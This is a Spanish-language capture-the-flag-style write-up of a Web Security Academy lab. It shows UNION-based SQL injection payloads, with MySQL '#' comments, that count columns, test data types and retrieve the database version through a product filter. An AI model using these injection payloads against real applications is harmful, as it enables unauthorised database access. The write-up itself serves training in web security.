---
title: "Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft"
date: 2025-12-28
category: "SQL Injection"
order: 9
tags: ["web-security-academy", "sql-injection", "lab", "mysql", "mssql"]
layout: layouts/writeup.njk
permalink: /writeups/sql-injection-lab-version-mysql-mssql.html
---

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

---

## Paso 1 — Saber el número de columnas

```sql
' ORDER BY 3# → Internal server error → 3-1 = 2 columnas
```

> Nota: acá el comentario se hace con `#` en vez de `--`, típico de MySQL.

## Paso 2 — Encontrar el tipo de dato de cada columna

```sql
' UNION SELECT 'a', NULL# → No error, acepta str
' UNION SELECT NULL, 'a'# → No error, acepta str
```

## Paso 3 — Consultar la versión de la base de datos ✅

```sql
' UNION SELECT 'a', @@version#
```

`@@version` es la variable de sistema que funciona tanto en **MySQL** como en **Microsoft SQL Server**, lo que la hace un buen primer intento cuando no se sabe con certeza cuál de los dos motores está corriendo. El payload devolvió el string de versión en la respuesta de la aplicación. Lab resuelto.
